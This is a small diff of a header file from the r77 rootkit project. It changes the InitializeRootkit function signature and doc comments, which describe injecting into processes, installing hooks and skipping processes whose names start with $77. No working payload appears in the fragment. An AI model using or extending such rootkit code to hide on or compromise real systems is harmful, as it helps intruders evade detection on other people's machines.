@@ -6,12 +6,11 @@
 /// Initializes r77, writes r77 header and installs hooks.
 /// <para>This function returns FALSE, if r77 is already injected, or if this process is either the r77 service or a helper process, or the process starts with $77.</para>
 /// </summary>
-/// <param name="module">The module of the injected DLL.</param>
 /// <returns>
 /// TRUE, if r77 was successfully loaded;
 /// otherwise, FALSE.
 /// </returns>
-BOOL InitializeRootkit(HINSTANCE module);
+BOOL InitializeRootkit();
 /// <summary>
 /// Detaches r77 from this process.
 /// </summary>
